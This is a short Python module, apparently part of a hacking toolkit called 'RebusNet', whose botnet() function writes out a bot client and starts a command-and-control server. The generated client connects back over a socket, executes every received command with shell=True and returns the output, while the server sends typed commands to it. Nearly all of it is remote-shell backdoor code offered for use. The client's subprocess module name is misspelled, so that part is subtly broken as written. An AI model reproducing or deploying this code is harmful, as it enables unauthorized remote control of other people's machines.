from modules.commun.plugins.settings import *



def botnet():
    print("Attempting to start the cnc and making a client please wait....")
    with open('BotForRebusNet.py', 'w') as f:
        f.write(f"""
#---Basic bot for now... ---#
import socket
import subprocess
user = '127.0.0.1'
port = 8081
client = socket.socket()
client.connect((user, port))
while True:
    command = client.recv(1024)
    command = command.decode()
    op = subproccess.Popen(command, shell=True, stderr=subproccess.PIPE, stdout=subproccess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    client.send(output + output_error)""")
        f.close()
    host = '127.0.0.1'
    port = 8081
    server = socket.socket()
    server.bind((host, port))
    print("[+] Server started... [+]")
    print("[+] Listening For Connection [+]")
    server.listen(500)
    client, client_addr = server.accept()
    print(f"[+] {client_addr} OO Someone Connected")
    while True:
        command = input(f"root@{client}~# ")
        command = command.encode()
        client.send(command)
        output = client.recv(1024)
        output = output.decode()
        print(output)